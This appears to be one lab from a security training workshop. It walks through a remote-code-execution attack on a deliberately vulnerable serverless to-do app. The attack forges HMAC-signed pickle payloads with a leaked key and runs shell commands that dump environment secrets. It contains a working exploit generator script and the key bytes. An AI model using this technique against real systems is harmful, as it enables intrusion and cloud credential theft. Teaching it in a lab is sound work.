# Lab 3

## Introduction

In the last lab, we found and exploited an XXE bug in the application. Using that bug, we were able to disclose source code of the application, which had the HMAC key hard-coded.

In this lab, we will use that HMAC key to generate a valid, malicious pickle data to gain remote code execution in the serverless container environment.

## Methodology

We discovered early on (and confirmed via our source code l00t) that the application parses XML import files, grabs `data` and `hmac` elements, validates the data using the HMAC, and then unpickles the data. If the data doesn't pass the HMAC check, it is rejected. Now that we have an HMAC key, we can leverage a "feature" of Python's pickle deserialization to gain code execution! In this lab, we'll:

1. Craft a pickle deserialization exploit
2. Generate an HMAC digest of that exploit that will pass the check
3. Automate payload generation with a Python script
4. Upload our exploit payload and observe the results

## Crafting a pickle deserialization exploit

The primary goal of our exploit is going to be to read the environment; because sensitive and dynamic data is often passed into the container via the environment, we are likely to find something useful there.

The Python `pickle` library is a serialization library that allows you to serialize Python objects; that is, flatten the object to a byte string, for transport to another Python process. Once it reaches the destination, it can be deserialized and used as an object again.

Let's deserialize our payload from before. Grab the body of the `data` element from your exported to-do list, open a Python interpreter, and deserialize it as follows:

```
>>> import pickle
>>> import base64
>>> pickle.loads(base64.b64decode('KGxwMAooZHAxClZsaXN0TmFtZQpwMgpWTTBycmlzCnAzCnNWdGFza0Rlc2NyaXB0aW9uCnA0ClZGb28gdGhlIGJhcgpwNQpzVnRhc2tJZApwNgpWNzlMclhrTjBtNEdYS2kzawpwNwpzYShkcDgKVmxpc3ROYW1lCnA5ClZNMHJyaXMKcDEwCnNWdGFza0Rlc2NyaXB0aW9uCnAxMQpWRnJvYiB0aGUgYml6CnAxMgpzVnRhc2tJZApwMTMKVkNWbDNrSWVHYVc0cVFIZjcKcDE0CnNhKGRwMTUKVmxpc3ROYW1lCnAxNgpWTTBycmlzCnAxNwpzVnRhc2tEZXNjcmlwdGlvbgpwMTgKVkJhciB0aGUgZnJvYgpwMTkKc1Z0YXNrSWQKcDIwClZZTHZvSlU3N2xYZTMwaHoxCnAyMQpzYS4='))

# Output: [{u'listName': u'M0rris', u'taskDescription': u'Foo the bar', u'taskId': u'79LrXkN0m4GXKi3k'}, ...
```

The `data` element contains a list of all the tasks we exported, in a pickle-serialized format. Easy enough!

Before we craft our payload, let's revisit how the pickle-deserialization vulnerability works. When an object is being pickled, if Python doesn't know how to pickle it (i.e. it is not a type from the standard library), the Pickle library looks for a class method called `__reduce__` that describes how to pickle the object. The function returns a tuple, which among other things, contains a function that serves as an entrypoint when the object is being unpickled.

You can read more [here](https://docs.python.org/2/library/pickle.html?highlight=__reduce__#object.__reduce__), but the gist is that we can craft a Python class that implements `__reduce__` in a way that will cause the interpreter on the serverless application to spit out a message. Let's try an initial payload:

```
import cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.check_output, (('/bin/sh', '-c', 'echo "Hello World"'),))

def main():
    data = cPickle.dumps(RunBinSh())
    print('<data>' + base64.b64encode(data) + </data>)

main()
```

Let's take a look at what this does.

While `__reduce__` can return a 5-tuple, only the first two items are required:

1. A function that the pickle library should call when deserializing the object on target
2. Arguments to that function

In this case, we will use  `subprocess.check_output` to invoke a shell and print the string "Hello World".

Run this Python script to see what it prints.

## Generating an HMAC to make it legit

Since we were able to capture the HMAC key in the previous lab, let's generate an HMAC digest of this pickle payload, to ensure the application will accept it for deserialization. Remember, if the XML doesn't contain all valid fields or contains invalid fields (including invalid Pickle data), we'll never reach the deserialization code.

Update your Python payload generator to calculate the HMAC, using our captured key:

```
import cPickle
import subprocess
import base64
import hmac
import hashlib

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.check_output, (('/bin/sh', '-c', 'echo "Hello World"'),))

def main():
    data = cPickle.dumps(RunBinSh())

    h = hmac.new('\x16q\x1c\x10\xfa\xa1\xf1\xf0}%\x95\xce\xa2\xf7\xd1\x8c-\rr\xe5\x91\x9eLS\x15\xbf\xe4\xc4\xd6F\x96\xbe', data, hashlib.sha256)
    digest = h.hexdigest()

    print('<?xml version="1.0"?>')
    print('<backup>')
    print('  <data>' + base64.b64encode(data) + '</data>')
    print('  <hmac>' + digest + '</hmac>')
    print('</backup>')

main()
```

Running that script should provide a valid document that we can import to our todo list.

## Uploading the payload

Run the Python script to generate your pickle exploit payload, save the payload to disk:

```
python make_pickle.py >Desktop/pickle_exploit.xml
cat Desktop/pickle_exploit.xml
```

Now upload it using the Import functionality:

![Pickle hello-world exploit](./images/3-pickle-hw.png)

It worked!

Let's use this code execution to read the environment. Change your pickle exploit payload to run the command `/bin/sh -c declare`; this will dump the environment back to us! Upload your payload, and see the results:

![Getting the environment via pickle deserialization](./images/3-env.png)

See anything interesting?

## Extra credit

See if you can find the names of all the lists people have created for this workshop.

## Recap

We were able to leverage pickle deserialization to gain code execution on the serverless container, which enabled us to leak AWS secrets from the environment. In order to have the application deserialize that pickle data, we needed to generate a valid HMAC digest using the key leaked in Lab 2.

## Vulnerabilities covered

| Designation | Description | Comment |
| :---: | --- | --- |
| A2:2017 | Broken Authentication | Pickle data validation is bypassed with leaked HMAC key |
| A5:2017 | Broken Access Control | (extra credit) |
| A8:2017 | Insecure Deserialization | Pickle deserialization is vulnerable to exploitation via `__reduce__` |
